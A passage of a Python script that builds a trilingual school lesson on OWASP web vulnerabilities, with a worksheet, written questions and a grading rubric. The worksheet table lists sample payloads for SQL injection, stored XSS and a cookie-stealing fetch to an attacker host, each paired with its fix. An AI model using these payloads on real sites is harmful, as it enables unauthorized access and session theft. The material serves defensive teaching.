    ["Hands-On Lab", "12-minute lab: Exploiting test endpoint and refactoring to prepared statements.", "Start 12-minute countdown timer and guide students."],
    ["Verification", "Security audit checklist: Verifying parameterized inputs and textContent encoding.", "Review code implementations on screens."],
    ["Evaluation", "10-point evaluation rubric breakdown.", "Explain grading thresholds."],
    ["Summary", "Wrap-up and homework preview. Next session: Modern authentication, JWT architecture, and 2FA.", "Collect worksheets."]
]

NOTES = {"uz": N_UZ, "ru": N_RU, "en": N_EN}

# ---------------------------------------------------------------- Varaqa Body
V = []
V.append(sheet_header(
    h1=("Kiberxavfsizlik: Veb Zaifliklari (OWASP Top 10)",
        "Кибербезопасность: Веб-Уязвимости (OWASP Top 10)",
        "CyberSecurity: Web Vulnerabilities (OWASP Top 10)"),
    sub=("Amaliy Laboratoriya Varaqasi · 9-sinf · 5-hafta · 23-dars",
         "Практический Рабочий Лист · 9 класс · Неделя 5 · Урок 23",
         "Hands-On Lab Worksheet · Grade 9 · Week 5 · Lesson 23")
))

V.append(mission(
    h=("Laboratoriya Vazifasi: SQLi va XSS Zaifliklarini Yopish",
       "Миссия Лабораторной: Закрытие Дыр SQLi и XSS",
       "Lab Mission: Patching Critical SQLi & XSS Vulnerabilities"),
    p=("Zaif veb-ilovadagi SQL Injection va XSS zaifliklarini aniqlash, ularni sinab ko'rish va "
       "parametrlangan so'rovlar (Prepared Statements) hamda HTML sanitizatsiya orqali butunlay bartaraf etish.",
       "Выявить уязвимости SQL Injection и XSS в учебном приложении, протестировать эксплойты "
       "и полностью защитить код с помощью параметризованных запросов и санитизации.",
       "Identify SQL Injection and XSS flaws in a vulnerable app, execute proof-of-concept exploits, "
       "and remediate the codebase using prepared statements and HTML sanitization."))
)

V.append(table(
    headers=[
        ("Zaiflik Turi", "Тип Уязвимости", "Vulnerability Class"),
        ("Xaker Exploit Matni", "Эксплойт Взлома", "Exploit Payload"),
        ("Himoyalangan Kod / Yechim", "Безопасное Решение", "Remediation Technique"),
        ("Holat", "Статус", "Status")
    ],
    rows=[
        [("1. SQL Injection", "1. SQL-Инъекция", "1. SQL Injection"),
         ("`' OR '1'='1' --`", "`' OR '1'='1' --`", "`' OR '1'='1' --`"),
         ("`db.query(sql, [username, pass])`", "`db.query(sql, [username, pass])`", "`db.query(sql, [username, pass])`"),
         ("✅ Tuzatildi", "✅ Исправлено", "✅ Patched")],
        [("2. Stored XSS", "2. Хранимая XSS", "2. Stored XSS"),
         ("`&lt;script&gt;steal()&lt;/script&gt;`", "`&lt;script&gt;steal()&lt;/script&gt;`", "`&lt;script&gt;steal()&lt;/script&gt;`"),
         ("`textContent` yoki HTML Entity Encoding", "Использование `textContent`", "Enforce `textContent` encoding"),
         None],
        [("3. Cookie Hijacking", "3. Кража Cookie", "3. Cookie Hijacking"),
         ("`fetch(attacker + document.cookie)`", "`fetch(attacker + document.cookie)`", "`fetch(attacker + document.cookie)`"),
         ("`httpOnly: true` (JS o'qiy olmaydi)", "Флаг `httpOnly: true` в cookie", "Flag `httpOnly: true` on cookies"),
         None],
        [("4. Broken Access", "4. Сбой Доступа", "4. Broken Access"),
         ("`/admin/users (ruxsatsiz)`", "Прямой переход `/admin/users`", "Direct object reference `/admin`"),
         ("Middleware da `role === 'admin'` tekshirish", "Проверка прав в middleware", "Role-based middleware guard"),
         None],
    ]
))

V.append(sheet_box(
    h=("Xavfsizlik Tahlili va Nazariy Savollar", "Анализ Безопасности и Вопросы", "Security Analysis & Written Queries"),
    body_html=writelines(3, label=("1. Nega oddiy qo'shtirnoq (') belgisi ma'lumotlar bazasi sintaksisini buzadi va Prepared Statements buni qanday hal qiladi?",
                                   "1. Почему одинарная кавычка (') ломает запрос SQL и как Prepared Statements предотвращают это?",
                                   "1. Why does an unescaped apostrophe break SQL syntax and how do Prepared Statements eliminate this?"))
             + "<br>"
             + writelines(3, label=("2. Agar Cookie-da 'httpOnly: true' flagi bo'lsa, xaker XSS orqali sessiya tokenini o'g'irlay oladimi? Tushuntiring.",
                                   "2. Может ли злоумышленник украсть сессионный токен через XSS при включённом 'httpOnly: true'? Обоснуйте.",
                                   "2. Can an adversary exfiltrate session tokens via XSS if 'httpOnly: true' is set? Explain why or why not."))
))

V.append(sheet_box(
    h=("Baholash Mezoni (10 Ball)", "Критерии Оценки (10 Баллов)", "Grading Rubric (10 Points)"),
    body_html=rubric([
        (("SQL Injection zaifligi topilib, Prepared Statements bilan tuzatilgan", "Уязвимость SQLi устранена параметризацией", "SQLi patched via Prepared Statements"), "3 ball"),
        (("XSS zaifligi bartaraf etilib, textContent va HttpOnly yoqilgan", "XSS устранён через textContent и флаг HttpOnly", "XSS neutralized via textContent & HttpOnly"), "3 ball"),
        (("TalkTalk insidenti sababi va oqibatlari to'g'ri tahlil qilingan", "Проведён анализ инцидента TalkTalk", "TalkTalk incident root cause correctly analyzed"), "2 ball"),
        (("Nazariy savollarga to'liq va asosli javob yozilgan", "Даны развернутые ответы на теоретические вопросы", "Written analytical queries answered thoroughly"), "2 ball"),
    ], "10 ball")
))

V.append("</div>\n" + sign_box("Musulmonov Mamarajab"))

VARAQA_BODY = "\n".join(V)

lesson = Lesson(
    outdir=D,
    titles=TITLES,
    sheet_titles=SHEET_TITLES,
    key="vc-notes-9-23",
    slides=S,
    notes=NOTES,
    varaqa_body=VARAQA_BODY
)

if __name__ == "__main__":
    out = lesson.build()
    print("Created:", out)
